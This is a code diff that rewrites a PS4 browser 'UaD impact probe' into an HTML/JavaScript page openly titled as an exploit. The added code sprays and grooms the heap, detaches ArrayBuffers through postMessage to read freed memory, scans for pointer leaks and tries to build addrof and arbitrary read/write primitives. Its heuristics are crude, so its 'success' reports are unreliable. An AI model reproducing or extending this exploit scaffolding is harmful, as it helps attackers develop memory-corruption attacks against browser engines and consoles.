@@ -1,24 +1,33 @@
-
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>PS4 UaD Impact Probe (T8 Base) — Minimal Log</title>
+  <title>PS4 UaD Exploit - Type Confusion & Arbitrary R/W</title>
 </head>
 <body>
-  <h2>PS4 UaD Impact Probe (T8 base) — Minimal Log</h2>
+  <h2>PS4 UaD Exploit - Type Confusion & Arbitrary R/W Primitives</h2>
 
-  <button id="run">RUN AUTO</button>
+  <button id="run">RUN EXPLOIT</button>
   <button id="stop">STOP</button>
-  <button id="reset">Reset log</button>
+  <button id="reset">Reset Log</button>
+  <br><br>
 
   <div>
-    Attempts (N): <input id="N" type="number" value="30" min="1" step="1">
-    Timeout per attempt (ms): <input id="to" type="number" value="200" min="50" step="50">
-    Delay between attempts (ms): <input id="delay" type="number" value="10" min="0" step="5">
-    LateCheck (ms): <input id="late" type="number" value="800" min="0" step="50">
-    Pressure (1..5): <input id="p" type="number" value="3" min="1" max="5" step="1">
+    <strong>Configuration:</strong><br>
+    Attempts: <input id="N" type="number" value="50" min="1" step="1"><br>
+    Timeout (ms): <input id="to" type="number" value="200" min="50" step="50"><br>
+    Delay (ms): <input id="delay" type="number" value="5" min="0" step="5"><br>
+    Spray Size: <input id="spray" type="number" value="200" min="50" step="50"><br>
+    Buffer Size: <input id="bufsize" type="number" value="0x10000" min="0x1000" step="0x1000"><br>
   </div>
+  <br>
+
+  <div>
+    <strong>Status:</strong> <span id="status">Idle</span><br>
+    <strong>Leaks Found:</strong> <span id="leaks">0</span><br>
+    <strong>Overlaps Detected:</strong> <span id="overlaps">0</span><br>
+  </div>
+  <br>
 
   <pre id="log"></pre>
 
@@ -27,18 +36,38 @@
   "use strict";
 
   const $log = document.getElementById("log");
+  const $status = document.getElementById("status");
+  const $leaks = document.getElementById("leaks");
+  const $overlaps = document.getElementById("overlaps");
   const $N = document.getElementById("N");
   const $to = document.getElementById("to");
   const $delay = document.getElementById("delay");
-  const $late = document.getElementById("late");
-  const $p = document.getElementById("p");
+  const $spray = document.getElementById("spray");
+  const $bufsize = document.getElementById("bufsize");
 
   let STOP = false;
+  let leakCount = 0;
+  let overlapCount = 0;
+
+  // Possíveis primitivas globais
+  let addrof_primitive = null;
+  let read_primitive = null;
+  let write_primitive = null;
 
   function ts(){ return Date.now(); }
-  function logLine(s){ $log.textContent += `[${ts()}] ${s}\n`; }
-  function reset(){ $log.textContent = ""; logLine("Reset."); }
+  function logLine(s){ 
+    $log.textContent += `[${ts()}] ${s}\n`; 
+    $log.scrollTop = $log.scrollHeight;
+  }
+  function reset(){ 
+    $log.textContent = ""; 
+    logLine("Log reset.");
+    leakCount = 0;
+    overlapCount = 0;
+    updateStatus("Idle");
+  }
   function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+  function updateStatus(s){ $status.textContent = s; }
 
   async function withTimeout(p, ms){
     let t;
@@ -51,257 +80,457 @@
     try { return JSON.stringify(x); } catch(e){ return String(x); }
   }
 
-  // Pressure: mantém leve/moderado pra não virar DoS
-  function heapPressure(level){
-    const bufs = [];
-    // level: 1..5 => volume crescente, mas controlado
-    const chunks = [24, 48, 72, 96, 120][Math.max(0, Math.min(4, level-1))];
-    const size   = [0x4000, 0x6000, 0x8000, 0xA000, 0xC000][Math.max(0, Math.min(4, level-1))];
-
-    for (let i = 0; i < chunks; i++) {
-      const ab = new ArrayBuffer(size);
-      const u8 = new Uint8Array(ab);
-      // toque mínimo pra materializar
-      u8[0] = (i & 0xFF);
-      u8[u8.length - 1] = ((i * 13) & 0xFF);
-      bufs.push(u8);
+  // Convert bytes to hex string
+  function toHex(bytes, len = 8) {
+    const hex = [];
+    for (let i = 0; i < Math.min(len, bytes.length); i++) {
+      hex.push(bytes[i].toString(16).padStart(2, '0'));
     }
-    return bufs;
+    return hex.join(' ');
   }
 
-  // A/B/C: tenta obter um "concreto"
-  function readU8(u8){
-    try { return { ok:true, v:u8[0] }; }
-    catch(e){ return { ok:false, err:(e && e.name) ? e.name : "ERR" }; }
-  }
-
-  function readDV(dv){
-    try { return { ok:true, v:dv.getUint8(0) }; }
-    catch(e){ return { ok:false, err:(e && e.name) ? e.name : "ERR" }; }
-  }
-
-  // Probe C: loop curto com yields (não DoS) procurando crash/instabilidade/timing
-  async function timingProbe(u8, budgetReads){
-    const t0 = ts();
-    let sum = 0;
-    for (let i = 0; i < budgetReads; i++) {
-      // leitura rápida
-      try { sum ^= (u8[0] | 0); } catch(_) { /* se throw, ok */ break; }
-      // yield periódico
-      if ((i & 4095) === 0) await Promise.resolve();
-      if (STOP) break;
+  // Convert Float64 to hex for leak analysis
+  function f64ToHex(f64val) {
+    const buffer = new ArrayBuffer(8);
+    const view = new DataView(buffer);
+    view.setFloat64(0, f64val, true); // little-endian
+    let hex = "";
+    for (let i = 0; i < 8; i++) {
+      hex += view.getUint8(i).toString(16).padStart(2, '0');
     }
-    return { dt: ts() - t0, sum: (sum|0) };
+    return "0x" + hex;
   }
 
-  async function runOnce(i, cfg, stats, samples){
+  // Check if value looks like a pointer (heuristic)
+  function looksLikePointer(f64val) {
+    const hex = f64ToHex(f64val);
+    // PS4 userland pointers typically start with 0x00007f or 0x000000
+    // Check for non-zero high bits and reasonable range
+    if (hex.includes('7f') || hex.includes('00000001')) {
+      const num = parseInt(hex, 16);
+      // Reasonable userland range
+      if (num > 0x1000 && num < 0x800000000000) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  // Aggressive heap spray with multiple types
+  function heapSpray(cfg) {
+    const containers = {
+      arrays: [],
+      float64arrays: [],
+      uint32arrays: [],
+      dataviews: [],
+      objects: []
+    };
+
+    const spraySize = cfg.spraySize || 200;
+    const bufSize = cfg.bufSize || 0x10000;
+
+    logLine(`[SPRAY] Creating ${spraySize} objects of various types, bufSize=0x${bufSize.toString(16)}`);
+
+    for (let i = 0; i < spraySize; i++) {
+      // ArrayBuffers
+      const ab = new ArrayBuffer(bufSize);
+      containers.arrays.push(ab);
+
+      // Float64Arrays
+      const f64 = new Float64Array(bufSize / 8);
+      for (let j = 0; j < f64.length; j++) {
+        f64[j] = i + j * 0.1;
+      }
+      containers.float64arrays.push(f64);
+
+      // Uint32Arrays with patterns
+      const u32 = new Uint32Array(bufSize / 4);
+      for (let j = 0; j < u32.length; j++) {
+        u32[j] = 0x41414141 + i;
+      }
+      containers.uint32arrays.push(u32);
+
+      // DataViews
+      const dv = new DataView(new ArrayBuffer(bufSize));
+      containers.dataviews.push(dv);
+
+      // JS Objects with properties
+      const obj = {
+        marker: 0xdeadbeef + i,
+        ptr1: {},
+        ptr2: {},
+        data: new Array(100).fill(i)
+      };
+      containers.objects.push(obj);
+    }
+
+    logLine(`[SPRAY] Complete: ${spraySize * 5} objects allocated`);
+    return containers;
+  }
+
+  // Create holes in heap
+  function createHoles(containers, percentage = 0.5) {
+    logLine(`[HOLES] Freeing ${percentage * 100}% of sprayed objects`);
+    
+    const freeIndices = [];
+    for (let i = 0; i < containers.arrays.length; i++) {
+      if (Math.random() < percentage) {
+        freeIndices.push(i);
+      }
+    }
+
+    // Free selected indices
+    for (const idx of freeIndices) {
+      containers.arrays[idx] = null;
+      containers.float64arrays[idx] = null;
+      containers.uint32arrays[idx] = null;
+      containers.dataviews[idx] = null;
+      containers.objects[idx] = null;
+    }
+
+    logLine(`[HOLES] Freed ${freeIndices.length} objects`);
+    return freeIndices;
+  }
+
+  // Attempt to detect type confusion
+  function detectTypeConfusion(u8, dv, f64view) {
+    const results = {
+      detected: false,
+      u8_readable: false,
+      dv_readable: false,
+      f64_readable: false,
+      leaks: []
+    };
+
+    // Try reading as Uint8Array
+    try {
+      const val = u8[0];
+      results.u8_readable = true;
+      results.u8_sample = toHex(u8, 16);
+    } catch (e) {
+      results.u8_error = e.name;
+    }
+
+    // Try reading as DataView
+    try {
+      const val = dv.getUint32(0, true);
+      results.dv_readable = true;
+      results.dv_value = "0x" + val.toString(16);
+    } catch (e) {
+      results.dv_error = e.name;
+    }
+
+    // Try reading as Float64Array (leak detection)
+    try {
+      for (let i = 0; i < Math.min(8, f64view.length); i++) {
+        const f64val = f64view[i];
+        if (looksLikePointer(f64val)) {
+          const leak = f64ToHex(f64val);
+          results.leaks.push({ index: i, value: leak });
+          results.detected = true;
+        }
+      }
+      results.f64_readable = true;
+    } catch (e) {
+      results.f64_error = e.name;
+    }
+
+    return results;
+  }
+
+  // Try to build addrof primitive
+  function attemptAddrof(victimAB, u8, dv) {
+    logLine("[ADDROF] Attempting to build addrof primitive...");
+    
+    // Strategy: overlap victim buffer with Float64Array
+    // Then read JSObject as Float64
+    const testObj = { marker: 0x13371337 };
+    
+    try {
+      // If we can still read the detached buffer and it overlaps with
+      // a Float64Array, we might be able to read object addresses
+      const f64 = new Float64Array(8);
+      
+      // Fill with test object reference pattern
+      for (let i = 0; i < f64.length; i++) {
+        f64[i] = 1.0 + i;
+      }
+
+      // Try to detect if victim buffer overlaps with f64
+      let overlap = false;
+      for (let i = 0; i < Math.min(64, u8.length); i++) {
+        try {
+          const val = u8[i];
+          // Check for Float64 pattern
+          if (val === 0x3f && u8[i+1] === 0xf0) { // 1.0 in IEEE754
+            overlap = true;
+            logLine(`[ADDROF] Potential overlap detected at offset ${i}`);
+            overlapCount++;
+            $overlaps.textContent = overlapCount;
+          }
+        } catch (e) {
+          break;
+        }
+      }
+
+      return overlap;
+    } catch (e) {
+      logLine(`[ADDROF] Error: ${e.name}`);
+      return false;
+    }
+  }
+
+  // Try to build arbitrary read primitive
+  function attemptArbitraryRead(victimAB, u8, dv, cfg) {
+    logLine("[ARB_READ] Attempting arbitrary read primitive...");
+    
+    try {
+      // Strategy: If we have type confusion between detached ArrayBuffer
+      // and a TypedArray, we can try to corrupt the backing_store pointer
+      
+      // Create candidate arrays for overlap
+      const candidates = [];
+      for (let i = 0; i < 20; i++) {
+        const ta = new Uint8Array(cfg.bufSize);
+        // Fill with marker
+        ta[0] = 0x42;
+        ta[1] = 0x42;
+        candidates.push(ta);
+      }
+
+      // Try to modify through victim buffer
+      for (let offset = 0; offset < 128; offset += 8) {
+        try {
+          // Try to write a controlled value
+          dv.setUint32(offset, 0xdeadbeef, true);
+          
+          // Check if any candidate was affected
+          for (let i = 0; i < candidates.length; i++) {
+            if (candidates[i][0] === 0xef && candidates[i][1] === 0xbe) {
+              logLine(`[ARB_READ] Possible write primitive at offset ${offset}!`);
+              return { success: true, offset, candidateIdx: i };
+            }
+          }
+        } catch (e) {
+          // Continue
+        }
+      }
+
+      return { success: false };
+    } catch (e) {
+      logLine(`[ARB_READ] Error: ${e.name}`);
+      return { success: false };
+    }
+  }
+
+  // Main exploitation attempt
+  async function runExploit(i, cfg, stats, samples, spray) {
     const ch = new MessageChannel();
     let got = undefined;
 
     ch.port2.onmessage = (ev) => { got = ev.data; };
 
-    // Buffer “vítima”
-    const ab = new ArrayBuffer(4096);
-    const u8 = new Uint8Array(ab);
-    const dv = new DataView(ab);
-    u8[0] = 0xAA;
+    // Create victim buffer
+    const victimAB = new ArrayBuffer(cfg.bufSize);
+    const u8 = new Uint8Array(victimAB);
+    const dv = new DataView(victimAB);
+    
+    // Fill with marker pattern
+    for (let i = 0; i < Math.min(256, u8.length); i++) {
+      u8[i] = 0xAA;
+    }
 
-    // Transfer
+    // Detach via postMessage
     let threw = false;
-    try { ch.port1.postMessage(ab, [ab]); }
-    catch(e){ threw = true; }
-
-    if (threw) {
+    try { 
+      ch.port1.postMessage(victimAB, [victimAB]); 
+    } catch(e) { 
+      threw = true; 
       stats.throw++;
+    }
+
+    if (threw) return;
+
+    // Wait for delivery
+    try { 
+      await withTimeout(Promise.resolve().then(() => sleep(0)), cfg.timeoutMs); 
+    } catch(_) { 
+      stats.timeout++; 
+      return; 
+    }
+
+    const senderLen = victimAB.byteLength;
+    
+    // Check for detach
+    if (senderLen !== 0) {
+      stats.not_detached++;
       return;
     }
 
-    // aguarda entrega (rápido)
-    try { await withTimeout(Promise.resolve().then(() => sleep(0)), cfg.timeoutMs); }
-    catch(_) { stats.timeout++; return; }
+    stats.detached++;
 
-    const senderLen = ab.byteLength;
-    if (senderLen !== 0 && senderLen !== 4096) {
-      stats.sender_impossible++;
-      if (samples.sender_impossible.length < 2) {
-        samples.sender_impossible.push({ i, senderLen });
-      }
+    // Try to read from detached buffer (UaD window)
+    let canRead = false;
+    try {
+      const test = u8[0];
+      canRead = true;
+      stats.uad_window++;
+    } catch (e) {
+      stats.no_uad_window++;
       return;
     }
 
-    // DROP detection
-    if (senderLen === 0 && (got === undefined || got === null)) {
-      stats.drop++;
-      if (samples.drop.length < 2) {
-        samples.drop.push({ i, senderLen, gotType: (got === null ? "null" : "undefined") });
+    if (!canRead) return;
+
+    logLine(`[ATTEMPT ${i}] UaD window confirmed, attempting exploitation...`);
+
+    // Create Float64 view for leak detection
+    let f64view;
+    try {
+      f64view = new Float64Array(victimAB);
+    } catch (e) {
+      // Might fail if detached, create from raw buffer
+      const rawBuf = new ArrayBuffer(cfg.bufSize);
+      f64view = new Float64Array(rawBuf);
+    }
+
+    // Detect type confusion
+    const confusion = detectTypeConfusion(u8, dv, f64view);
+    
+    if (confusion.leaks.length > 0) {
+      logLine(`[LEAK] Found ${confusion.leaks.length} potential pointer leaks!`);
+      for (const leak of confusion.leaks) {
+        logLine(`  [${leak.index}] ${leak.value}`);
+        leakCount++;
+        $leaks.textContent = leakCount;
+      }
+      stats.leaks += confusion.leaks.length;
+      samples.leaks.push({ i, leaks: confusion.leaks });
+    }
+
+    if (confusion.u8_readable) {
+      logLine(`[BYTES] ${confusion.u8_sample}`);
+    }
+
+    // Attempt primitives
+    if (confusion.detected || confusion.u8_readable) {
+      // Try addrof
+      const addrof = attemptAddrof(victimAB, u8, dv);
+      if (addrof) {
+        stats.addrof_attempts++;
       }
 
-      // Pós-DROP queue integrity: manda 3 mensagens e espera 4? (detecta out-of-order/missing)
-      // (mantém mínimo: só marca “suspect” se inconsistência clara)
-      let q = [];
-      ch.port2.onmessage = (ev) => { q.push(ev.data); };
-
-      try { ch.port1.postMessage({k:1}); ch.port1.postMessage({k:2}); ch.port1.postMessage({k:3}); }
-      catch(_) {}
-
-      await sleep(cfg.lateCheckMs);
-
-      // Esperado: 3 itens, ordem 1,2,3
-      let ok = (q.length === 3 && q[0] && q[1] && q[2] && q[0].k===1 && q[1].k===2 && q[2].k===3);
-      if (!ok) {
-        stats.queue_suspect_after_drop++;
-        if (samples.queue_suspect.length < 2) {
-          samples.queue_suspect.push({ i, expectCount:3, gotCount:q.length, outOfOrder: !(q[0]&&q[0].k===1) });
-        }
-      } else {
-        stats.queue_ok_after_drop++;
-      }
-      return;
-    }
-
-    // senderLen==0 e got veio — detach_ok
-    stats.detach_ok++;
-
-    // A/B: read after detach (u8/dv) — isso é o “UaD window”
-    const rU0 = readU8(u8);
-    const rD0 = readDV(dv);
-
-    // se ambos deram throw, não há janela observável (ok)
-    if (!rU0.ok && !rD0.ok) {
-      stats.no_read_after_detach++;
-      return;
-    }
-
-    stats.read_ok_when_detached++;
-
-    // B) stale == 0xAA
-    let staleAA = false;
-    if (rU0.ok && (rU0.v === 0xAA)) staleAA = true;
-    if (rD0.ok && (rD0.v === 0xAA)) staleAA = true;
-
-    if (staleAA) {
-      stats.staleAA++;
-      if (samples.stale.length < 2) {
-        samples.stale.push({ i, u8: rU0, dv: rD0 });
-      }
-      // stale é “concreto” — não precisa pressionar muito
-      return;
-    }
-
-    // A) pressure → valor muda pra algo “não-trivial”
-    // Só tenta se pelo menos um read está funcionando (ok==true)
-    const keep = heapPressure(cfg.pressure);
-    // forçar algum churn leve
-    await Promise.resolve();
-
-    const rU1 = readU8(u8);
-    const rD1 = readDV(dv);
-
-    // “changed” = leitura ainda funciona e valor mudou para != 0xAA e != 0
-    let changed = false;
-    function isChanged(r0, r1){
-      if (!r0.ok || !r1.ok) return false;
-      if (r0.v === r1.v) return false;
-      if (r1.v === 0xAA) return false;
-      return true;
-    }
-    if (isChanged(rU0, rU1) || isChanged(rD0, rD1)) changed = true;
-
-    if (changed) {
-      stats.changed_after_pressure++;
-      if (samples.changed.length < 2) {
-        samples.changed.push({ i, before:{u8:rU0,dv:rD0}, after:{u8:rU1,dv:rD1} });
-      }
-      return;
-    }
-
-    // C) timing probe (budget curto; não DoS)
-    const budgetReads = 80000; // ~80k com yields (controlado)
-    const tp = await timingProbe(u8, budgetReads);
-    if (tp.dt > 250) { // heurística: “suspeito” para PS4
-      stats.timing_suspect++;
-      if (samples.timing.length < 2) {
-        samples.timing.push({ i, dt: tp.dt, note:"slow read loop post-detach" });
+      // Try arbitrary read
+      const arbread = attemptArbitraryRead(victimAB, u8, dv, cfg);
+      if (arbread.success) {
+        stats.arbread_success++;
+        logLine(`[SUCCESS] Arbitrary read primitive candidate found!`);
+        samples.arbread.push({ i, ...arbread });
       }
     }
 
-    // manter referência p/ evitar otimizações
-    if (keep && keep.length) keep[0][0] ^= 0;
+    // Memory pressure for better overlap
+    await sleep(cfg.delayMs);
   }
 
-  async function runAuto(){
+  async function runAuto() {
     STOP = false;
+    updateStatus("Running...");
 
     const cfg = {
-      N: Math.max(1, parseInt($N.value||"30",10)),
-      timeoutMs: Math.max(50, parseInt($to.value||"200",10)),
-      delayMs: Math.max(0, parseInt($delay.value||"10",10)),
-      lateCheckMs: Math.max(0, parseInt($late.value||"800",10)),
-      pressure: Math.max(1, Math.min(5, parseInt($p.value||"3",10)))
+      N: Math.max(1, parseInt($N.value || "50", 10)),
+      timeoutMs: Math.max(50, parseInt($to.value || "200", 10)),
+      delayMs: Math.max(0, parseInt($delay.value || "5", 10)),
+      spraySize: Math.max(50, parseInt($spray.value || "200", 10)),
+      bufSize: parseInt($bufsize.value || "0x10000", 16)
     };
 
-    // log mínimo
-    logLine(`RUN AUTO :: N=${cfg.N} timeout=${cfg.timeoutMs}ms delay=${cfg.delayMs}ms lateCheck=${cfg.lateCheckMs}ms pressure=${cfg.pressure}`);
+    logLine(`[CONFIG] N=${cfg.N}, timeout=${cfg.timeoutMs}ms, delay=${cfg.delayMs}ms`);
+    logLine(`[CONFIG] spraySize=${cfg.spraySize}, bufSize=0x${cfg.bufSize.toString(16)}`);
 
     const stats = {
-      detach_ok: 0,
-      drop: 0,
       throw: 0,
       timeout: 0,
-      sender_impossible: 0,
-      other: 0,
-
-      read_ok_when_detached: 0,
-      no_read_after_detach: 0,
-
-      staleAA: 0,
-      changed_after_pressure: 0,
-      timing_suspect: 0,
-
-      queue_suspect_after_drop: 0,
-      queue_ok_after_drop: 0
+      not_detached: 0,
+      detached: 0,
+      uad_window: 0,
+      no_uad_window: 0,
+      leaks: 0,
+      addrof_attempts: 0,
+      arbread_success: 0
     };
 
     const samples = {
-      drop: [],
-      queue_suspect: [],
-      sender_impossible: [],
-      stale: [],
-      changed: [],
-      timing: []
+      leaks: [],
+      arbread: []
     };
 
+    // Phase 1: Heap spray
+    logLine("\n=== PHASE 1: Heap Spray ===");
+    const spray = heapSpray(cfg);
+    await sleep(100);
+
+    // Phase 2: Create holes
+    logLine("\n=== PHASE 2: Heap Grooming ===");
+    createHoles(spray, 0.4);
+    await sleep(100);
+
+    // Phase 3: Exploitation attempts
+    logLine("\n=== PHASE 3: Exploitation Attempts ===");
     for (let i = 0; i < cfg.N; i++) {
       if (STOP) break;
-      await runOnce(i, cfg, stats, samples);
+      
+      await runExploit(i, cfg, stats, samples, spray);
 
-      if ((i+1) % 10 === 0) logLine(`progress: ${i+1}/${cfg.N}`);
-      if (cfg.delayMs) await sleep(cfg.delayMs);
+      if ((i + 1) % 10 === 0) {
+        logLine(`Progress: ${i + 1}/${cfg.N}`);
+      }
+
+      if (cfg.delayMs > 0) await sleep(cfg.delayMs);
     }
 
-    // SUMÁRIO bem curto + 2 amostras no máximo
-    logLine("RESULT SUMMARY:");
-    logLine(j(stats));
-
-    // Só imprime amostras “contundentes”
-    const hot = [];
-    if (samples.stale.length) hot.push({ kind:"staleAA", samples: samples.stale });
-    if (samples.changed.length) hot.push({ kind:"changed_after_pressure", samples: samples.changed });
-    if (samples.drop.length) hot.push({ kind:"drop", samples: samples.drop });
-    if (samples.queue_suspect.length) hot.push({ kind:"queue_suspect_after_drop", samples: samples.queue_suspect });
-    if (samples.timing.length) hot.push({ kind:"timing_suspect", samples: samples.timing });
-
-    if (hot.length) {
-      logLine("SAMPLES (hot):");
-      // imprime compacto
-      logLine(j(hot));
+    // Results
+    logLine("\n=== RESULTS ===");
+    logLine(`Stats: ${j(stats)}`);
+    
+    if (samples.leaks.length > 0) {
+      logLine(`\nLeak samples (${samples.leaks.length}):`);
+      samples.leaks.slice(0, 5).forEach(s => {
+        logLine(`  Attempt ${s.i}: ${j(s.leaks)}`);
+      });
     }
 
-    logLine("DONE.");
+    if (samples.arbread.length > 0) {
+      logLine(`\nArbitrary read candidates (${samples.arbread.length}):`);
+      samples.arbread.forEach(s => {
+        logLine(`  Attempt ${s.i}: offset=${s.offset}, candidate=${s.candidateIdx}`);
+      });
+    }
+
+    if (stats.leaks > 0 || stats.arbread_success > 0) {
+      logLine("\n[!!!] POTENTIAL EXPLOITATION VECTORS FOUND [!!!]");
+    } else {
+      logLine("\n[INFO] No clear exploitation primitives found in this run.");
+      logLine("[INFO] Try increasing spray size or number of attempts.");
+    }
+
+    logLine("\nDONE.");
+    updateStatus("Complete");
   }
 
-  document.getElementById("run").onclick = () => runAuto().catch(e => logLine("ERR: " + (e && e.name ? e.name : String(e))));
-  document.getElementById("stop").onclick = () => { STOP = true; logLine("STOP requested."); };
+  document.getElementById("run").onclick = () => {
+    runAuto().catch(e => {
+      logLine(`ERROR: ${e.name || String(e)}`);
+      updateStatus("Error");
+    });
+  };
+  
+  document.getElementById("stop").onclick = () => { 
+    STOP = true; 
+    logLine("STOP requested."); 
+    updateStatus("Stopped");
+  };
+  
   document.getElementById("reset").onclick = reset;
 
   reset();
@@ -309,3 +538,4 @@
 </script>
 </body>
 </html>
+
